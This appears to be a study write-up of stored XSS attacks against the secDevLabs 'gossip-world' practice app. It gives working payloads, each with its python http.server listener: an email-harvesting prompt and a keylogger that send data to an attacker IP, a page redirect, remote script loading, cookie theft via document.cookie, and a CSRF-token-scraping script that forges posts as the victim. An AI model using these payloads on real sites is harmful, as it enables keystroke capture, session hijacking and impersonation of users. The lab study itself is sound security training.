# Definition
Code injection.
## Installing and Preparing labs
I use [secDevLabs](https://github.com/globocom/secDevLabs) to practice with this vulnerability.
```shell
git clone https://github.com/globocom/secDevLabs
cd secDevLabs/owasp-top10-2021-apps/a3/gossip-world/
make install
```
Open the web using *http://localhost:10007*
# Attacking
## Understanding
### Verifying XSS Vulnerability
We could verify if the website interprets scripts and injecting code.
![[Pasted image 20230628191921.png|700x450]]

----
### Getting Email Address
Setting up http server on attacker device.
```bash
sudo python3 -m http.server 80
```
----
Script to be injected.
```html
<script>
	var email = prompt("Please, enter your email address to view the post", "example@example.com");
	if (email == null || email == "") {
		alert("Please, enter a valid email.");
	}
	else {
		fetch("http://192.168.200.128/?email=" + email)
	}
</script>
```
---- 
### Key Logger
Setting up http server on attacker device and pipe in real time pressed keys.
```bash
sudo python3 -m http.server 80 2>&1 | sed -n '/GET \// { s/%20/ /g; p }'
```
----
Script to be injected.
```html
<script>
	var k = "";
	document.onkeypress = function(e) {
		e = e || window.event;
		k += e.key;
		var i = new Image();
		i.src = "http://192.168.200.128/" + k;
	};
</script>
```
---- 
Host server pipe output.
![[Pasted image 20230628192818.png|1300x600]]

----
### Redirecting to Insecure Web
Script to inject.
```html
<script>
	window.location.href = "https://cxnsxle.hashnode.dev";
</script>
```
----
## Using External Scripts
We should inject script code so the web connects with us to do anything that we want (replace *SCRIPT from ATTACKER* with your script name).
```html
<script src="http://192.168.200.128/<SCRIPT from ATTACKER>.js"></script>
```
### Cookie Hijacking
We have 2 users logged on 2 differents web browsers *brave* and *firefox*.
- *cxnsxle* user cookie: eyJfY3NyZl90b2tlbiI6Ijc0YjhlYTQ0LTVhMmYtNDAyMy1hMTk4LTk0NWMxZDcxMzM5YiIsInVzZXJuYW1lIjoidGVzdCJ9.ZJzUIg.-qn7ZpitV7hgfPEvWMlkw6VzOuY
- *test* user cookie: eyJfY3NyZl90b2tlbiI6ImJiNjk4N2I2LTdiNmEtNDlmYi1hZjllLWY3OTcyMjIyOWRhMiIsInVzZXJuYW1lIjoiY3huc3hsZSJ9.ZJzR-Q.OQaDB3GJqlhJYXNcTexRZvzgI5g
Disable [[HttpOnly]] on *test* user.
![[Pasted image 20230628195050.png]]

----
Script *cookieHijacking.js* to hijack cookie of *test* user.
```js
var request = new XMLHttpRequest();
request.open('GET', 'http://192.168.200.128/?cookie=' + document.cookie);
request.send();
```
----
Create a http server to retrieve connection from *test* user.
```shell
sudo python3 -m http.server 80
```
----
Then, from the *test* browser he should click on the post with the malicious code.
And finally, you can use *test* cookie to do anything that he cans.
![[Pasted image 20230628200040.png|1500x600]]

----

### Being Evil
We are going to do that anyone user, that see a malicious post in the web, he will create a post with impolite content.
- Let's start creating the malicious code into the malicious post by using *cxnsxle* user.
![[Pasted image 20230628220358.png|600x400]]

----
- Then, we are intercepting the data sent when we create a new post by using [[BurpSuite]].
![[Pasted image 20230628220152.png]]
This uses a POST method.
- Now, we are going to create a malicious script so *test* user cans create a new impolite post.
```js
var domain = "http://localhost:10007/newgossip"
var req1 = new XMLHttpRequest();
req1.open('GET', domain, false);			// false -> Syn (waits for response), true -> Asyn (doesn't wait for response)
req1.withCredentials = true;
req1.send();

var response = req1.responseText;
var parser = new DOMParser();
var doc = parser.parseFromString(response, 'text/html');
var token = doc.getElementsByName('_csrf_token')[0].value;

var req2 = new XMLHttpRequest();
var title_txt = 'MY%20BOSS%20IN%20AN%20IDIOT';
var subtitle_txt = 'BOSS%20YOU%20ARE%20AN%20ASSHOLE';
var text_txt = 'My%20boss%20has%20not%20paid%20me%20two%20months%20ago%20and%20he%20is%20an%20asshole%20with%20me';
var post_data = 'title=' + title_txt + '&subtitle=' + subtitle_txt + '&text=' + text_txt + '&_csrf_token=' + token;
req2.open('POST', domain, false);			// false -> Syn (waits for response), true -> Asyn (doesn't wait for response)
req2.withCredentials = true;
req2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
req2.send(post_data);
```
----
- Finally, when the *test* user see the malicious post, he will create a impolite post abouse his payment.
![[Pasted image 20230628221016.png]]
![[Pasted image 20230628221034.png]]

----